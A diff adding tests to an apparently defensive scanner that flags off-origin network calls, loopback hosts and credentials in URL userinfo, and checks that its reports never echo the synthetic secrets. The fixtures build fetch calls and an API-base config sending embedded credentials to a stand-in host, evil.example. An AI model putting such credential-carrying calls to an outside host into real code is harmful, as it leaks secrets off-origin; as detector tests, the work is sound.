@@ -363,6 +363,37 @@ describe('diagnostic output boundary (#285)', () => {
   });
 });
 
+describe('userinfo cannot become destination context (#285)', () => {
+  it.each(['localhost:12345', '127.0.0.1:12345', '10.20.30.40:12345',
+    '192.168.1.23:12345', 'http://localhost:12345', 'https://127.0.0.1:23456',
+    'prefix-localhost:12345', 'prefix-10.20.30.40:12345'])('%s stays private inside either userinfo field', (credential) => {
+    for (const userinfo of [`SYNTH_USER_285:${credential}`, `${credential}:SYNTH_PASSWORD_285`]) {
+      const source = `fetch("https://${userinfo}@evil.example/x")`;
+      const hits = scan(source);
+      expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+      const sourceHits = violationsIn(source, 'src/example.ts') as Violation[];
+      expect(sourceHits.length).toBeGreaterThan(0);
+      const binaryHits = scan(source, new Set(['emitted-loopback-host', 'emitted-url-userinfo']));
+      expect(binaryHits.length).toBeGreaterThan(0);
+      const config = apiConfigViolationsIn(`VITE_API_BASE=https://${userinfo}@evil.example/x`) as Violation[];
+      expect(config.length).toBeGreaterThan(0);
+      for (const report of [hits, sourceHits, binaryHits, config]) {
+        const output = JSON.stringify(report).toLowerCase();
+        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
+          expect(output).not.toContain(secret.toLowerCase());
+        }
+      }
+      for (const asset of ['index.js', 'metadata.png']) {
+        const output = capturedCliOutput(source, asset).toLowerCase();
+        expect(output).toContain('[emitted-');
+        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
+          expect(output).not.toContain(secret.toLowerCase());
+        }
+      }
+    }
+  });
+});
+
 describe('encoded and binary diagnostic output (#285)', () => {
   const encodedCharacters = Array.from({ length: 95 }, (_, index) => index + 32)
     .flatMap((code) => {
